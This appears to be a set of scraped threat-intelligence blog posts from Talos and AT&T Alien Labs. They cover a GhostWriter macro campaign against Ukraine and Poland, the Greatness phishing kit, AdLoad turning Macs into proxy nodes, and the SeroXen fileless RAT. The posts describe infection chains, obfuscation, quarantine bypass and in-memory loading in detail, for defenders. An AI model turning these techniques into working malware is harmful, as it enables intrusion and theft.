Chinese state-sponsored actors reportedly accessed email accounts belonging to several U.S.-based organizations and federal government agencies, including the State Department. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) released a detailed timeline on the campaign, stating that an investigation from Microsoft revealed that “advanced persistent threat (APT) actors accessed and exfiltrated unclassified Exchange Online Outlook data” after users reported suspicious activities in their Microsoft 365 cloud environment. While the full scope of the hack is still under investigation, reports indicate that the actors were primarily trying to steal sensitive information. While CISA or Microsoft have yet to disclose any specific vulnerabilities the actors exploited, the CISA report does say that the APT used a Microsoft account consumer key to forge tokens and impersonate targeted users. “Microsoft remediated the issue by first blocking tokens issued with the acquired key and then replacing the key to prevent continued misuse,” the report states. (CISA, CNN)

Popular tax preparation software companies are under fire from lawmakers for allegedly sharing personal information with social media sites, including Google and Meta. Several Democratic lawmakers released a report last week that accused TaxAct, H&R Block and TaxSlayer of embedding Meta and Google’s tracking pixels on their sites, potentially violating U.S. law and sharing taxpayers’ information with those companies. The report says the data was kept anonymous, but the companies could “easily” use the information to identify individuals or create targeted advertising for them. The report has also renewed calls for the Internal Revenue Service to offer its own, free online tax filing service for U.S. consumers. (Vox, USA Today)

Apple had to roll back and then re-release a security update that addressed an actively exploited vulnerability in WebKit. Apple initially released a Rapid Security Response patch for iPhones and iPads on July 11 to fix CVE-2023-37450, a remote code execution vulnerability in the WebKit browser engine that Safari and other web browsers use. However, users reported that the fix was causing Safari to not connect correctly to major websites like Facebook, Instagram and Zoom, leading Apple to pull back the patch. Since then, Apple released a new fix for iOS, iPadOS and macOS that reliably fixes the vulnerability again. Though few details are currently available about CVE-2023-37450, Apple indicated it had been exploited in the wild and could be triggered by a vulnerable browser processing specially crafted web content.

“Most prevalent malware files” is taking a break this week for maintenance."
Talos Intelligence Blog 8,https://blog.talosintelligence.com/need-to-know-commodity-malware/,"Whether known as commodity malware or “as-a-service,” threat actors have long been turning to their fellow adversaries in the hopes of selling off their tools and opening a new stream of revenue.

When used legitimately, as-a-service software is when a third-party company offers its software to another company based on a license that is renewed frequently (mostly monthly or yearly) for a fee. The software is centrally hosted on that third-party company’s servers. Think of cloud storage solutions like Dropbox or Plex, for example.

Threat actors have been using this business model for a decade-plus, originally known as commodity malware. This is when threat actors create a suite of malware tools and offer them up for sale on illicit websites. It can range from asking “customers” to pay a monthly fee for access to this set of tools to use in cyber attacks, or users can even pay the original creators to distribute the malware on their behalf and manage the infection.

Recently, this model for threat actors has come to be known as the “as-a-service"" model, borrowing the term from the growing trend in the tech industry.

Ransomware-as-a-service is a relatively new version of these commodity groups, such as DarkSide, known for the cyber attack in 2021 that disrupted the Colonial oil pipeline and made gas more expensive for thousands of U.S. consumers.

But other bad actors have since adopted this businesses model, offering every from command and control servers to phishing bots-as-a-service. There are a few reasons why attackers may opt to pay for an as-a-service malware tool for their chosen campaign:

As-a-service saves attackers time. When they pay for someone else’s malware kit, whether it be ransomware or a phishing bot, they don’t have to invest time, money or labor to write their own malicious code or tools and instead can hop right into deploying the malware.

For the actors and groups who originally created the malware, it is a more reliable income stream for them. Usually, they’d have to hope a successful attack leads to a ransom payment or some sort of other financial windfall. Instead, they can make money by marketing their services to other bad actors for a fee.

Bad actors who want to get into the cyber attack business need little to no technical skills to get started. When an attacker pays for an as-a-service malware, they often get an individual login with dedicated customer support, much like any user would with a legitimate piece of software. This way, they can ask questions and receive help if they get stuck during the deployment of the malware. This means that, conceivably, anyone with interest could get involved in starting a cyber attack.

As Nick Biasini explained in a past episode of Talos Takes, name recognition also plays a major part in the rising popularity of this business model. Lesser-known threat actors want to piggyback off having a big name associated with them, like DarkSide, to intimidate their actors or lend more credence to the effectiveness of their threats.

Notable example: Greatness

Cisco Talos researchers recently discovered Greatness, one of the most advanced phishing-as-a-service tools ever seen in the wild. Our analysis indicates that attackers may have been using attackers since mid-2022.

Greatness offers the ability for users to bypass targets’ multi-factor authentication protections, IP filtering and integration with Telegram bots. Greatness incorporates features seen in some of the most advanced PaaS offerings, such as multi-factor authentication (MFA) bypass, IP filtering and integration with Telegram bots.

Greatness, for now, is only focused on Microsoft 365 phishing pages, providing its affiliates with an attachment and link builder that creates highly convincing decoy and login pages. It contains features such as having the victim’s email address pre-filled and displaying their appropriate company logo and background image, extracted from the target organization’s real Microsoft 365 login page. This makes Greatness particularly well-suited for phishing business users.

Any Greatness affiliates don’t need a specific set of skills. All they need to do is deploy and configure the provided phishing kit with an API key. If used successfully, the attacker can set up a proxy Microsoft 365 authentication system and steal a victim’s authentication credentials or cookies with a “man-in-the-middle"" attack.

Greatness is specifically designed to work in a standardized way so that the experience is the same for each customer who buys into the service, potentially allowing anyone with a moderate amount of technical ability to carry out advanced, convincing phishing attacks.

Since as-a-service or commodity malware can include all types of malware, it can be tough to provide specific advice for detection and prevention. For Greatness specifically, anyone implementing multi-factor authentication should opt for code-based authentication through their MFA app of choice, such as Cisco Duo, rather than the easier-to-break method of a simple “yes” or “no” push notification."
Talos Intelligence Blog 9,https://blog.talosintelligence.com/implementing-an-iso-compliant-threat-intelligence-program/,"Implementing a threat intelligence program that meets the definition of threat intelligence control as described in ISO/IEC 27002:2022 — a set of standards set forth by the International Organization for Standardization — is not onerous.

The ISO/IEC 27002 standard describes a non-exhaustive list of security controls that organizations can implement on their own or as part of an ISO/IEC 27001-compliant cybersecurity program.

The guidance within ISO 27001 identifies which security controls are appropriate, while ISO 27002 describes the controls in detail and how they can be implemented. Threat intelligence is a recent addition to the controls having been included in the 2022 edition of the standards, which are adopted by more than 160 countries around the world.

What is threat intelligence?

Threat intelligence is simply information about threats. The goal of threat intelligence is to help decision-makers make better decisions by being better informed about current threats and those they may face in the future.

In a world where the risks posed by the ever-changing cyber threat landscape are in constant flux, yet resources are constrained, deciding which security measures should be deployed depends on risk appetite and an understanding of the nature of the threats. Effective threat intelligence informs decision-makers in a timely manner about how the threat landscape is changing and enables management to act to counter these threats.

Acting against threats may be as simple as updating a block list or require considering where investments in new countermeasures should be made. The standard states that the purpose of threat intelligence should be to “provide awareness of the organization's threat environment so that the appropriate mitigation actions can be taken.” The details of exactly what actions are required are for the organization’s decision-makers to choose.

Obtaining threat intelligence

Few organizations routinely generate intelligence from their own data. Most organizations receive and make use of intelligence published from third parties such as government agencies, specialist providers or collaborative groups.

At Talos, we pride ourselves on the quality of the intelligence we publish. We publish intelligence on the significant threats that we identify on our blog and provide a summary of recent key threats in our weekly Threat Source newsletter.

Organizations can collect this intelligence, review the threats described, consider if and how the threat is relevant to them, and the necessity of making any potential additional mitigations. Circulating this information to the relevant people provides vital awareness of current threats, and provides actionable intelligence if changes need to be made to counteract these.

A threat intelligence program

At its simplest, a rudimentary threat intelligence program consists of the program’s objectives, the sources from where intelligence will be gathered, the frequency of that collection, and what will we do with the gathered information.

The wording of ISO/IEC 27002 provides an outline for the program’s potential objectives. Threat intelligence should be: “relevant, insightful, contextual, actionable.” The collection of intelligence that satisfies these four requirements will almost certainly be useful to wider cybersecurity activity.

Setting out the sources of intelligence may be as easy as listing the providers of threat intelligence that are already consulted, and how often they will be consulted. Subscribing to the Talos weekly newsletter provides information about the most prevalent malware.

This intelligence can be used to identify which (if any) of the organization’s defense systems detected the threat. Reflecting on if the threat could have been detected earlier and passing any recommendations to management constitutes a viable threat intelligence program.

The Talos Threat Spotlight posts and Quarterly Trends reports provide details of threats and the techniques used by threat actors. Analysing these and considering how (or if) such malicious strategies would be detected and blocked, or if additional mitigations are required, and passing this information to management would also be an effective use of threat intelligence.

Further Controls

Additional controls defined in ISO/IEC 27002 can form part of the threat intelligence process or benefit from an intelligence input. Relevant controls include:

5.6 Contact with special interest groups - being part of a community sharing experiences and intelligence with industry peers allows the further collection of intelligence and contextualization of that information.

8.7 Protection against malware & 8.23 Web filtering – informing users about the current threats that they are likely to face, providing information about they can identify threats and helping protect systems helps improve the organization’s security posture.

8.8 Management of technical vulnerabilities – prioritizing the mitigation and patching of vulnerabilities based on their potential and current risk of abuse requires identifying the assessed severity of a vulnerability and how this may change.

8.15 Logging & 8.16 Monitoring activities – determining the system information to log, store and query allows malicious behavior to be uncovered, if threat intelligence is applied to understand how threats may manifest themselves within log data."
Talos Intelligence Blog 10,https://blog.talosintelligence.com/malicious-campaigns-target-entities-in-ukraine-poland/,"Cisco Talos has discovered a threat actor conducting several campaigns against government entities, military organizations and civilian users in Ukraine and Poland. We judge that these operations are very likely aimed at stealing information and gaining persistent remote access.

The activity we analyzed occurred as early as April 2022 and as recently as earlier this month, demonstrating the persistent nature of the threat actor. Ukraine’s Computer Emergency Response Team (CERT-UA) has attributed the July campaign to the threat actor group UNC1151, as a part of the GhostWriter operational activities allegedly linked to the Belarusian government.

The attacks used a multistage infection chain initiated with malicious Microsoft Office documents, most commonly using Microsoft Excel and PowerPoint file formats. This was followed by an executable downloader and payload concealed in an image file, likely to make its detection more difficult.

The final payloads include the AgentTesla remote access trojan (RAT), Cobalt Strike beacons and njRAT.

Ukrainian and Polish government and military organizations among those targeted

Talos first discovered a campaign in late April using several malicious files very likely intended for users in Ukraine, based on the content of the lure displayed when the target opens a malicious Microsoft Excel file. Talos eventually uncovered additional campaigns, including the two previously mentioned by Ukraine’s Computer Emergency Response Team (CERT-UA) and FortiGuard Labs researchers. The campaigns we discovered also involve malicious files intended for users in Poland.

The actor is focusing on Ukrainian and Polish government and military targets, based on the content of Excel and PowerPoint lures that include official-looking images and text. The purpose of these socially engineered lures is to convince the targeted users to enable macros, thereby allowing the execution chain to commence. This is the first stage of the attack, as demonstrated in the timeline below.

Timeline of the various attacks.

Stages of the attack: The lure entices the user to enable macros that infect the system

Of the two file types, the PowerPoint files are more unusual in that they would not show any actual slides when opened, but would still execute the malicious VBA code, a finding consistent with CERT-UA’s analysis. Talos is currently researching whether the file’s failure to open is because they are intentionally corrupted. In any case, the VBA code still runs whenever the files are executed. Based on the files’ thumbnail images – the only content visible in the Windows Explorer window – the PowerPoint files imitate Ukraine’s Ministry of Defence and Poland’s Ministry of National Defence. The image below shows the thumbnail images indicating the campaign’s victims.

Thumbnail images show themes used by PowerPoint lures in these campaigns by the actor.

As opposed to the PowerPoint documents that did not display any slides in our testing environments, all Excel documents display legitimate-looking documents related to the targeted military organizations, or generic descriptions on how to enable VBA macro functionality in Excel. The VBA code in the Excel and PowerPoint-based campaigns displays a high level of similarity. The content of one of the Excel lures is shown below and contains the form for calculating salary payments (cash certificates) for soldiers of a specific military unit.

September 2022 campaign uses a lure that purports to be an official document from the Ukrainian Ministry of Defence.

The actor returned with a new campaign on July 4, 2023. The lure contains a payment instruction form containing VBA code, which appears to have been sent from the State Treasury Service of Ukraine. The content of the form is legitimate and targets Ukrainian government organizations, as seen in the image below. The form also contains legitimate macro code modified by the attacker to call malicious subroutines. It seems that the legitimate macro code is used to calculate some values in the spreadsheets, but the legitimate functions are changed to call the function that starts the infection process.

Ukrainian and Polish businesses, general users also targeted

The generic campaigns are aimed at various civilian targets in Poland and Ukraine, such as with Excel spreadsheet lures masquerading as value-added tax (VAT) return forms. Others include Excel spreadsheets that contain socially engineered instructions on how to enable macros in Excel so that the malicious VBA code can be executed. These two lures are shown below, respectively.

April 2023 campaign targeting business users in Poland with a fake VAT return form.

The majority of the Excel campaigns show some element of luring the user to enable macros in Excel with specific content using Ukrainian language.

Attacks start with VBA code to decode the next malware stage

All campaigns start with Microsoft Office documents, which are possibly sent to the targets as email attachments. In most cases, the file is an Excel spreadsheet containing a VBA macro, but we also found four instances where a malicious PowerPoint OLE2 (PPT) file was used, possibly indicating the actor's readiness to use file formats less commonly used in attacks.

VBA code is responsible for dropping the downloader executable or DLL.

The VBA code in all files is similar, with minor variations, where some functions serve a legitimate purpose (e.g., some functions for conversion of strings into numbers in Excel). The code is obfuscated, using an obfuscator script, based on the fact that some comments the actor didn’t strip are also obfuscated when the words written in the comments are not recognized as a part of the VBA syntax.

As seen below in the image, the obfuscator randomizes function and variable names but makes the mistake of not recognizing the comments (in green).

Randomized code comments show the code was likely obfuscated by an automated tool.

The code contains the next stage stored as hexadecimal encoded strings and is split into multiple strings so that an antivirus scan would not detect the content as potentially malicious. There are three main subroutines: the first is launched when the document is opened (e.g., Auto_Open, Workbook_Open), the second creates a randomly named dynamic loading library (DLL) file in the user’s temporary files folder, and the third creates a randomly named shortcut (LNK) file which contains code to run regsvr32.exe (or rundll32.exe) to launch the next stage.

The name of the shortcut file, depending on the campaign, is either randomly generated by a random string generator function or hardcoded in the macro code. In some campaigns, the random names are generated by a specific function in the VBA code. The screenshot above shows the function that generates a random string of variable length, specified in the function argument.

One subroutine calls the DLL dropper, LNK creation and launch routine.

Earlier campaigns used an executable downloader, while the later ones used DLLs for the next stage.

In some instances, two randomly generated bytes are added to the end of the file, which invalidates the detection of the dropped files using simple checksum-based techniques.

In some cases randomly generated bytes are added to the end of the dropped file.

The July 2023 campaign has a slightly modified infection chain. The dropper first creates a shortcut file but the dropped DLL is launched with rundll32.exe instead of regsvr32.exe. Once the initial export is called (in this case, the legitimately named function IETrackingProtectionEnabled), the downloader will copy itself and call regsvr32.exe with parameters “/u /s” to automatically call the function for unregistering COM servers DllUnregisterServer.

Eventually, when the DLL is copied into its final path, rundll32.exe is used to call the exported function SetQueryNetSessionCount, which downloads the next stage. The final payload of the July 2023 campaign is njRAT, which increases our confidence that the threat actor's goals are information stealing and remote control of the targeted systems. NjRAT is an open-source remote access trojan (RAT) whose source code is freely available and is used by commodity actors and APTs, making the process of attribution more difficult.

July 2023 campaign's main malicious VBA function is Data_Open.

Obfuscated downloader retrieves an image containing the payload

The next stage is a Portable Executable (PE) file, an executable or a DLL file. ConfuserEx obfuscator, an obfuscator that is very commonly used by malicious actors to obfuscate .NET code, is used with various levels of obfuscation, anti-tampering and anti-debugging, which makes the unpacking more difficult for malware researchers. CERT-UA named the downloader PicassoLoader.

All downloaders attempt to download an image file from a URL. Depending on the campaign, the final payload or the third intermediate stage is appended as an encrypted binary blob to the end of the image. The image will still display in viewers but the downloader will extract the executable content using the appropriate decryption key and the decryption algorithm.

The encrypted next-stage blob is appended to the end of a JPEG image.

The downloader uses managed AES (Rijndael algorithm) to decrypt the appended data which is then reflectively loaded as a byte array using the Assembly.Load function as seen below. The decryption key and the initialization vector are either stored as obfuscated strings in the body of the downloader or calculated as an MD5 checksum of the downloaded image file.

The downloader first decrypts the third stage and then loads it using the Assembly.Load function.

The code to download the next stage is in constant development. In earlier versions, the call to the Assembly.Load function is fairly easy to spot. In the later campaigns, the actor has chosen to add a layer of obfuscation and use the RuntimeBinder.Binder functionality to find and invoke functions for downloading, decryption and loading.

Later variants of the downloader use Binder to invoke functions.

Earlier variants use RijndaelManaged implementation of AES decryption routine to decrypt the next stage, while the variant from April 2023 uses a simplified variant of RC4 to decrypt the payload appended to an image file. The variant from July 2023 returns to RijndaelManaged.

Managed Rijndael is used to decrypt the third stage.

Simplified RC4 is used to decrypt the third stage in April 2023.

Most of the URLs and the infrastructure were not accessible at the time of analysis, although we managed to obtain images from three campaigns to recreate the infection chain. Our analysis triggered exceptions in the decryption process, so it is possible that the image files we obtained were corrupted or that the implementation of decryption in some of the downloaders was incorrect.

Nevertheless, previous analyses by CERT-UA and FortiGuard Labs indicate that final payloads, which included AgentTesla and Cobalt Strike, were used for information theft and remote access to infected systems.

AT&T Cybersecurity Labs Research 2,https://cybersecurity.att.com/blogs/labs-research/mac-systems-turned-into-proxy-exit-nodes-by-adload,"This blog was jointly written by Fernando Martinez Sidera and Ofer Caspi, AT&T Alien Labs threat intelligence researchers.

Executive summary

AdLoad malware is still infecting Mac systems years after its first appearance in 2017. AdLoad, a package bundler, has been observed delivering a wide range of payloads throughout its existence. During AT&T Alien Labs’ investigation of its most recent payload, it was discovered that the most common component dropped by AdLoad during the past year has been a proxy application turning MacOS AdLoad victims into a giant, residential proxy botnet.

Key takeaways:

AdLoad malware is still present and infecting systems, with a previously unreported payload.

At least 150 samples have been observed in the wild during the last year.

AT&T Alien Labs has observed thousands of IPs behaving as proxy exit nodes in a manner similar to AdLoad infected systems. This behavior could indicate that thousands of Mac systems have been hijacked to act as proxy exit nodes.

The samples analyzed in this blog are unique to MacOS, but Windows samples have also been observed in the wild.

Analysis

AdLoad is one of several widespread adware and bundleware loaders currently impacting macOS. The OSX malware has been present since 2017, with big campaigns in the last two years as reported by SentinelOne in 2021 and Microsoft in 2022. As stated in Microsoft’s report on UpdateAgent, a malware delivering AdLoad through drive-by compromise, AdLoad redirected users’ traffic through the adware operators’ servers, injecting advertisements and promotions into webpages and search results with a Person-in-The-Middle (PiTM) attack.

These two previous campaigns, together with the campaign described in this blog, support the theory that AdLoad could be running a pay-per-Install campaign in the infected systems.

The main purpose of the malware has always been to act as a downloader for subsequent payloads.

It has been identified delivering a wide range of payloads (adware, bundleware, PiTM, backdoors, proxy applications, etc.) every few months to a year, sometimes conveying different payloads depending on the system settings such as geolocation, device make and model, operating system version, or language settings, as reported by SentinelOne.

In all observed samples, regardless of payload, they report an Adload server during execution on the victim’s system.

This beacon (analyzed later in Figure 3 & 4) includes system information in the user agent and the body, without any relevant response aside from a 200 HTTP response code.

This activity probably represents AdLoad's method of keeping count of the number of infected systems, supporting the pay-per-Install scheme.

AT&T Alien Labs™ has observed similar activity in our threat analysis systems throughout the last year, with the AdLoad malware being installed in the infected systems. However, Alien Labs is now observing a previously unreported payload being delivered to the victims. The payload corresponds to a proxy application, converting its targets into proxy exit nodes after infection. As seen in Figure 1, the threat actors behind this campaign have been very active since the beginning of 2022.

Figure 1. Histogram of AdLoad samples identified by Alien Labs.

The vast number of samples in the wild have consequently led to many devices becoming infected. Alien Labs has identified over 10,000 IPs reaching out to the proxy servers each week that have the potential to be proxy exit nodes. It is unclear if all these systems have been infected or are voluntarily offering their systems as proxies, but it could be indicative of a bigger infection globally.

The intentions behind the users of this botnet for residential proxy systems is still unclear, but so far it has already been detected delivering SPAM campaigns. A campaign was suffered by the University of Illinois, who had to release an internal alert to notify their students of this thread.

Figure 2. University of Illinois alert at https://answers.uillinois.edu/illinois/page.php?id=120871.

This blog will focus on a sample of AdLoad, which AT&T Alien Labs observed in the wild during the month of June: 6587e61a8a7edb312da5798ffccf4a5ef227d3834389993b4df3ef0b173443dc. This sample was named “app_assistant”. Together with ‘main_helper’ or ‘mh’ are the most common filenames observed for this malware.

The sample initiates the execution with a system profiler. The system profiler pulls system information focusing in on the UUID (Universally Unique Identifier) that can be used later to identify the system with the Command and Control (C&C) on the proxy servers.

It then reaches out to an AdLoad server to report the infection. The URL is hardcoded in the sample. Alien Labs has observed two different patterns thus far:

Pattern 1 includes:

POST request to a URL with path “/l”.

Host with api. Subdomain.

Content Type is “application/x-www-form-urlencoded"".

The body starts with “cs=” and is followed by around 300 base64 characters.

This behavior had already been observed in the wild and is detected by ET (Emerging Threats) with a public rule attributing the activity to OSX/SHLAYER (Rule in the appendix).

Figure 3: Example from Alien Labs of network traffic of sample 54efc69cb6ee7fde00c0320202371dcdad127d0e7c8babce4659be8230d81a81.

Pattern 2 includes:

POST request to a URL with path “/a/rep”

Host with m. subdomain

Content Type is charset=utf-8

The body starts with “smc” and is followed by encrypted data.

No public rules were identified for this behavior as of the publishing of this blog, however Alien Labs has provided a rule in the appendix.

In both cases, the User Agent is formed by the filename of the executed file followed by “(unknown version) CFNetwork/$version” plus the Darwin version number.

Figure 4: Example from Alien Labs: network traffic of sample 6587e61a8a7edb312da5798ffccf4a5ef227d3834389993b4df3ef0b173443dc.

After beaconing to the AdLoad server, the sample reaches out to a different domain, usually vpnservices[.]live or upgrader[.]live, appearing to be a proxy server’s C&C. The request carries as a parameter the UUID of the infected machine among other encoded parameters. This request responds with a link of the file to download, usually in digitaloceanspaces[.]com. It also includes the environment to use and the version number of the payload.

Figure 5 summarizes the different connections Alien Labs has observed as of the publishing of this article (steps 1-5), and the activity we will describe next (steps 5-8).

Figure 5: Infection process as analyzed by Alien Labs.

Attack chain, Steps 5-8

Once the malware downloads the proxy app, it is unzipped with a password, and xattr -rd is executed on the files to remove the quarantine attribute from them. This bypasses Gatekeeper’s security.

The existing files are copied to ‘/Users/$user/Library/Application Support/$randomstring’. Any unnecessary files placed in the system, the /tmp directory, and the original zip file are deleted.

At this point, the newly generated folder under Application Support has two files: the first is a version control named ‘pcyx.ver’ and the second contains the proxy application, usually named ‘helper’ or ‘main’. If the proxy application is already running, the malware kills it, and then executes it in the background. During its execution, AdLoad gains persistence by installing itself as a Launch Agent with organization name usually formed by org.[random long string].plist, which points at the proxy application executable in the Application Support folder.

The application is already running, and the hosts start operating as a proxy server. Its initial configuration is usually hardcoded (figure 6), but it can be modified through the previous request to the proxy C&C, modifying the used domain, port, environment, etc. The communication with proxy servers usually occurs over port 7001, but it has also been seen over port 7000 and 7002, probably alternatives in case 7001 is taken.

Figure 6: As observed by Alien Labs: the malware configuration includes C&C address, certificate, malware version and more.

As the application runs, its first action is to beacon system information and status to the proxy server. It sends a registration message to its C&C after collecting the machine’s information. This data includes macOS version, hardware stats like CPU, memory, and battery status. Additionally, it extracts the machine’s UUID, labeled as “peer_id”, that is used as identifier of the machine with the C&C (figure 7).

After registration with its C&C, the malware receives the proxy manager server to which it forwards proxy requests.

Figure 7: Collecting system information before registering as new peer.

Many of the proxy requests immediately issued after an infection appear to be testing queries, i.e., iplookups or access to streaming services like Netflix, HBO or Disney, from specific locations. Figure 8 shows the beacon and the response from the server, together with the request for an IP Lookup, which arrived at the infected system through port 7001.

Figure 9 shows more clearly how the IP Lookup is forwarded to its actual destination and the received response is sent back to the proxy server.

Figure 8: Beacon and and IPlookup as observed by Alien Labs, d94f62ec4b6ffcec35d5e639d02a52ce226629a5eb3e2a7190174ea8d3b40b5b.

The beacon message shown in figure 8 is sent every few seconds to get further instructions from the C&C. This includes requests for updated hardware information to check if the machine may be running into issues soon and should not be loaded as proxy (low battery or high CPU usage) (Figure 10).

Figure 10: Pinging C&C for further instructions, observed by Alien Labs.

Alien Labs has identified several domains as proxy server nodes that were relaying the proxy requests to the infected systems. These domains all had generic randomly generated names, like bapp.pictureworld[.]co and were hosted in usually reliable cloud services, like Amazon or Oracle. However, they appeared to only be used as DNS resolvers, since those IPs happened to all resolve to a private company domain around the time of infection. The company name also showed up in the certificates of some of these generic domains.

Based on the above information, a small business selling proxy services appears to be behind the proxy activity. The list of prices published in this private company webpage, does include residential IP proxys as an offered service.

In addition to the Mac samples analyzed in this blog, Alien Labs has also identified other Windows samples replicating the behavior just explained. These Windows samples also end up acting as proxies through the known ports 7000, 7001 and 7002, with traffic coming from the same domains. AT&T Alien Labs will be releasing a new blog in the upcoming weeks with that analysis.

Recommended actions

To remove AdLoad samples from the system:

AdLoad samples can be identified with the Yara rule included in the Appendix, originally created by SentinelOne in a previous AdLoad report. Analyze any system matching suricata rules 4002758 and 2038612.

To remove the proxy application from the system:

Review ‘/Users/X/Library/Application Support/’ and look for a folder named with a string of over 20 randomly generated characters, which contains files like: main, helper, pcyx.ver; and are currently running in your system in the background. Understand the need for all the existing Launch Agents plists in /Library/LaunchAgents/. Especially looking for another long string of random characters, and identify the existing agents, deleting the unnecessary ones. Analyze any systems communicating though port 7000, 7001 or 7002 to suspicious IPs (or matching suricata rules 4002756 and 4002757).

Conclusion

The pervasive nature of AdLoad potentially infecting thousands of devices worldwide — indicates that users of MacOS devices are a lucrative target for the adversaries behind this malware and are being tricked to download and install unwanted applications. The underreporting of MacOS based threats may lead users to a false sense of security and underscores that any popular operating system can become a target for skilled adversaries.

AT&T Alien Labs is not aware whether the private company relaying the proxy requests is actively infecting the systems, or they are buying what they believe to be legitimate systems. However, their proxy servers are accessing these systems and selling a similar service to their clients. Buyers are leveraging the benefits of a residential proxy botnet: anonymity, wide geolocation availability and high IP rotation; to deliver SPAM campaigns through the last year.

Mapped to MITRE ATT&CK

The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques:"
AT&T Cybersecurity Labs Research 3,https://cybersecurity.att.com/blogs/labs-research/seroxen-rat-for-sale,"This blog was jointly written with Alejandro Prada and Ofer Caspi.

Executive summary

SeroXen is a new Remote Access Trojan (RAT) that showed up in late 2022 and is becoming more popular in 2023. Advertised as a legitimate tool that gives access to your computers undetected, it is being sold for only $30 for a monthly license or $60 for a lifetime bundle, making it accessible.

Key takeaways:

SeroXen is a fileless RAT, performing well at evading detections on static and dynamic analysis.

The malware combines several open-source projects to improve its capabilities. It is a combination of Quasar RAT, r77-rootkit and the command line NirCmd.

Hundreds of samples have shown up since its creation, being most popular in the gaming community. It is only a matter of time before it is used to target companies instead of individual users.

Analysis

Quasar RAT is a legitimate open-source remote administration tool. It is offered on github page to provide user support or employee monitoring. It has been historically associated with malicious activity performed by threat actors, APT groups (like in this Mandiant report from 2017), or government attacks (in this report by Unit42 in 2017).

It was first released in July 2014 as “xRAT” and renamed to “Quasar” in August 2015. Since then, there have been released updates to the code until v1.4.1 in March 2023, which is the most current version. As an open-source RAT tool with updates 9 years after its creation, it is no surprise that it continues to be a common tool used by itself or combined with other payloads by threat actors up to this day.

In a review of the most recent samples, a new Quasar variant was observed by Alien Labs in the wild: SeroXen. This new RAT is a modified branch of the open-source version, adding some modifications features to the original RAT. They’re selling it for monthly or lifetime fee. Figure 1 contains some of the features advertised on their website.

Figure 1. SeroXen features announced on its website.

This new RAT first showed up on a Twitter account, established in September 2022. The person advertising the RAT appeared to be an English-speaking teenager. The same Twitter handle published a review of the RAT on YouTube. The video approached the review from an attacking/Red Team point of view, encouraging people to buy the tool because it is worth the money. They were claiming to be a reseller of the tool.

In December 2022, a specific domain was registered to market/sell the tool, seroxen[.]com. The RAT was distributed via a monthly license for $30 USD or a lifetime license of $60 USD. It was around that time that the malware was first observed in the wild, appearing with 0 detections on VirusTotal.

After a few months, on the 1st of February, the YouTuber CyberSec Zaado published a video alerting the community about the capabilities of the RAT from a defensive perspective. In late February, the RAT was advertised on social media platforms such as TikTok, Twitter, YouTube, and several cracking forums, including hackforums. There were some conversations on gaming forums complaining about being infected by malware after downloading some video games. The artifacts described by the users matched with SeroXen RAT.

The threat actor updated the domain name to seroxen[.]net by the end of March. This domain name was registered on March 27th, 2023, after seroxen[.]com was decommissioned. The threat actor used GoDaddy for registration and Cloudflare for hosting the website. These domains are only used for selling and marketing purposes, and not for Command and Control (C&C) communications.

Based on the packed versions uploaded to VT, it appears that the RAT is being used for targeting video game users. Several lure injector cheat files have been observed with names invoking popular videogames such as Fortnite, Valorant, Roblox or Warzone2. The threat actor used Discord for the distribution of some of the samples.

Figure 3. SeroXen timeline.

One of the most relevant announced features is that it is a fully undetectable version. This is currently true from a static analysis point of view, since the RAT is packaged into an obfuscated PowerShell batch file. The file's size typically ranges between 12-14 megabytes, as we can see in sample 8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87 uploaded to VT on May 21. Due to its relatively large size, certain antivirus may choose not to analyze it, potentially bypassing detection. This sample currently has 0 detections on VT, but some of the crowdsourced Sigma Rules do detect the activity as suspicious.

As the malware is fileless and executed only in memory after going through several decryptions and decompression routines, it is more difficult to detect by antiviruses. In addition, its rootkit loads a fresh copy of ntdll.dll, which makes it harder to detect by Endpoint Detection & Response (EDR) solutions that hook into it to detect process injections.

Regarding the dynamic analysis, it is worth noting that some sandbox environments might fail to detect the RAT due to its utilization of several techniques to evade virtualization and sandbox detection mechanisms and string encryption subsequent payloads.

The RAT employs anti-debugging techniques by leveraging Windows Management Instrumentation (WMI) to identify the system's manufacturer. This enables it to identify virtualization environments such as VMware and abort the execution to delay and make the analysis harder. The RAT also checks for the presence of debuggers and uses pings make the threads sleep.

Currently, most child processes and files dropped during the execution of the RAT have a low detection rate.

Execution analysis

When the malicious payload is delivered to the victim, commonly through a phishing mail or a Discord channel - the victim often receives a ZIP file containing a benign file in plain sight, and the heavily obfuscated batch file is hidden and automatically executed when launched. The bat file format is always very similar and looks like the contents of Figure 4, followed by base64 encoded text later in the file.

Figure 4. Obfuscated bat script.

During the bat execution, the script extracts two separate binaries from the base64 encoded text, AES decrypts, and GZIP decompresses it to produce two separate byte arrays. These byte arrays are then used with .NET reflection to perform an in-memory load of the assembly from its bytes, locate the binary’s entry point, and perform an Invoke on both.

Throughout the decryption process, the attackers had the need to create a legitimate looking folder to drop an illicit version of the System Configuration Utility msconfig.exe that is required later. For this purpose, the script creates the folder “C:\Windows \System32\”, with a space after Windows and deletes it as soon as the utility is running. If it wasn’t for this file temporarily dropped into disk, the RAT would be fully fileless.

The execution of one of the above-mentioned binaries leads to another obfuscated binary carrying an embedded resource. This resource is hidden behind anti-sandboxing and debugger techniques, only to lead to more obfuscation and encryption techniques that lead to the final payload. This payload has been built using the Github project Costura, which allows SeroXen to pack the code’s dependencies into the .NET assembly so it can run self-contained.

Figure 5. Payload embedded resources.

The extraction of the resources leads to the final payloads. This is in the form of two .NET assemblies: CSStub2.InstallStager.exe, and CSStub2.UninstallStager.exe. And a Win32 binary called CSStub2.$sxr-nircmd.exe, which corresponds to the unmodified command-line utility NirCmd.

The payload InstallStager.exe is a compilation of the open-source rootkit named r77-rootkit – a fileless ring 3 rootkit written in .NET. This rootkit supports both x32 and x64 Windows processes and has the following features:

Fileless persistence: The rootkit is stored as obfuscated data in the registry and is spawned with PowerShell via Task Scheduler to be injected into the winlogon.exe process.

Child process hooking.

Option to embed additional malware to be executed with the rootkit – in this case NirCmd and/or Quasar. The added malware will be decompressed and decrypted before it is injected into other processes.

In memory process injection: the rootkit injects itself and additional malware(s) into all processes. Injection is done from memory: no files are needed to be stored on disk.

Hooking: Hooks several functions from ntdll.dll to hide its presence.

Communicating via NamedPipe: The rootkit can receive a command from any running process.

